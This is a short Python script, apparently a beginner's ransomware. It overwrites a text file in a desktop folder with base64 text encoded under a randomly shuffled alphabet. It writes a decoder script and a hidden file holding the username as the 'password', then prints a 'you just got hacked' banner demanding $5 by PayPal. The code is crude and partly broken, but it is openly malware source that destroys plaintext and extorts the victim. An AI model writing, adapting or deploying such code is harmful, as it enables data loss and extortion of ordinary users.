import os
import random

base64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
rand = random.sample(range(1, 64), 63)
decode = []
decode = [random.randrange(63) for i in range(0, 63)]
base64 = [base64[rand[element]] for element in range(0, (len(rand) - 1))]
base64_crypted = "".join(base64)

TGREEN = '\033[32m'  # Green Text
TRED = '\033[31m'  # Red Text
ENDC = '\033[m'  # reset to the defaults

def encode(mot):
    mot = mot.encode()
    car_list = []
    car_block = []
    base64String = ''
    for lettre in mot:
        a = bin(lettre)
        car_list.append(a[2:])
    position = 0
    for element in car_list:
        car_list[position] = element.zfill(8)
        position += 1
    car_string = ''.join(car_list)
    for i in range(0, len(car_string), 6):
        car_block.append(car_string[i:i + 6])
    if len(car_block[len(car_block) - 1]) < 6:
        car_block[len(car_block) - 1] += '0' * (6 - len(car_block[len(car_block) - 1]))
    for objet in car_block:
        g = int(objet, base=2)
        base64String += base64_crypted[g]
    if len(base64String) % 4 != 0:
        base64String += '=' * (4 - (len(base64String) % 4))
    return base64String


# crypte file txt
file_txt = open("/Users/" + os.getlogin() + "/Desktop/mdr/test.txt", "r")
test = str(file_txt.read())
test2 = ''.join(encode(test))
file_txt = open("/Users/" + os.getlogin() + "/Desktop/mdr/test.txt", "w+")
file_txt.write(test2)
file_txt.close()
# Create password
password = base64_crypted
# Create decodeur.py
file_decodeur = open("/Users/" + os.getlogin() + "/Desktop/mdr/decodeur.py", "w+")
file_decodeur.write("import os  \r\nbase64 = '"+base64_crypted+"'\r\ndef decode(mot):\r\n    if len(mot) % 4 == 0:\r\n        mot = mot.replace('=', '')\r\n        car_list = [bin(base64.index(car)) for car in mot]\r\n        list = [element[2:] for element in car_list]\r\n        list = [element.zfill(6) for element in list]\r\n        car_string = ''.join(list)\r\n        car_string = car_string[:(len(car_string) - len(car_string) % 8)]\r\n        car_bytes = int(car_string, base=2).to_bytes(len(car_string) // 8, 'big')\r\n        return car_bytes.decode()\r\n        pass\r\nfile_save = open('/Users/' + os.getlogin() + '/Desktop/mdr/.save.txt', 'r')\r\nrealpass = str(file_save.read())\r\nfile_save.close()\r\npassword = input('password for decrypte your txt files: ')\r\nif password[0] == realpass[0]:\r\n    file_txt = open('/Users/'+os.getlogin()+'/Desktop/mdr/test.txt', 'r')\r\n    test = str(file_txt.read())\r\n    test2 = ''.join(decode(test))\r\n    file_txt = open('/Users/'+os.getlogin()+'/Desktop/mdr/test.txt', 'w+')\r\n    file_txt.write(test2)\r\n    file_txt.close()\r\n    print('your files is now decrypted have a nice day')\r\nelse:\r\n    print('fail wrong password')")
file_decodeur.close()
# Create the hide file save.txt
# TODO -> add password
file_save = open("/Users/" + os.getlogin() + "/Desktop/mdr/.save.txt", "w+")
file_save.write(os.getlogin())
file_save.close()
# print the H4CK3R information
print(
    TGREEN + 38 * "=" + "\n     _  _   _   ___ _  _____ ___  \n    | || | /_\\ / __| |/ / __|   \\ \n    | __ |/ _ \\ (__| ' <| _|| |) |\n    |_||_/_/ \\_\\___|_|\\_\\___|___/\n\n" + 38 * "=" + "\n\n • You just got hacked by the H4CK3R™ \n\n • All your files are been crypted\n\n • For uncrypt your files you must send \n   5$ to my PayPal : jeanlasalle@desport.com",
    ENDC)
